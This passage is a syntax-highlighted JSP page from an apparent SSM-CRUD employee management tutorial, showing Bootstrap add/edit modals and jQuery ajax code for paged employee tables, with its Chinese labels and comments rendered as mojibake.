class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> ç”·</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> å¥³</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            éƒ¨é—¨æäº¤éƒ¨é—¨idå³å¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span> <span class="attr">id</span>=<span class="string">"dept_add_select"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                                éƒ¨é—¨åç§°-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>å…³é—­<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_save_btn"</span>&gt;</span>ä¿å­˜<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-å‘˜å·¥ä¿®æ”¹çš„æ¨¡æ€æ¡†-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empUpdateModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span>&gt;</span>å‘˜å·¥ä¿®æ”¹<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"form-control-static"</span> <span class="attr">id</span>=<span class="string">"empName_update_static"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_update_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_update_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> ç”·</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_update_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> å¥³</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            éƒ¨é—¨æäº¤éƒ¨é—¨idå³å¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-  éƒ¨é—¨åç§°-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>å…³é—­<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_update_btn"</span>&gt;</span>æ›´æ–°<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ ‡é¢˜-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æŒ‰é’®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span> <span class="attr">id</span>=<span class="string">"emp_delete_all_btn"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºè¡¨æ ¼æ•°æ®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"check_all"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    å‘˜å·¥æ•°æ®ç­‰-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ–‡å­—ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºé¡µç ç­‰ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºåˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    var totalRecords,currentPage;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //1.é¡µé¢åŠ è½½å®Œæˆä»¥åï¼Œç›´æ¥å»å‘é€ä¸€ä¸ªajaxè¯·æ±‚ï¼Œè¦åˆ°åˆ†é¡µæ•°æ®</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //å»é¦–é¡µ</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.è§£æå¹¶æ˜¾ç¤ºå‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.è§£æå¹¶æ˜¾ç¤ºåˆ†é¡µæ¡æ•°æ®</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºtable</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var checkBoxTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'checkbox'</span> <span class="attr">class</span>=<span class="string">'check_item'</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"ç”·":"å¥³");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             ç¼–è¾‘</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm edit_btn")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("ç¼–è¾‘");</span></span><br><span class="line"><span class="xml">            //ä¸ºç¼–è¾‘æŒ‰é’®æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„å±æ€§ï¼Œæ¥è¡¨ç¤ºå½“å‰å‘˜å·¥id</span></span><br><span class="line"><span class="xml">            editBtn.attr("edit-id",item.empId);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             åˆ é™¤</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm delete_btn")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("åˆ é™¤");</span></span><br><span class="line"><span class="xml">            //ä¸ºåˆ é™¤æŒ‰é’®æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„å±æ€§ï¼Œæ¥è¡¨ç¤ºå½“å‰å‘˜å·¥id</span></span><br><span class="line"><span class="xml">            delBtn.attr("del-id",item.empId);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //appendæ–¹æ³•æ‰§è¡Œå®Œæˆä¹‹åè¿˜æ˜¯è¿”å›åŸæ¥çš„å…ƒç´ </span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(checkBoxTd)</span></span><br><span class="line"><span class="xml">                .append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //è§£ææ˜¾ç¤ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºåˆ†é¡µä¿¡æ¯</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("å½“å‰"+result.extend.pageInfo.pageNum+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"é¡µ,æ€»"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"æ¡è®°å½•");</span></span><br><span class="line"><span class="xml">        totalRecords = result.extend.pageInfo.total;</span></span><br><span class="line"><span class="xml">        currentPage = result.extend.pageInfo.pageNum;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    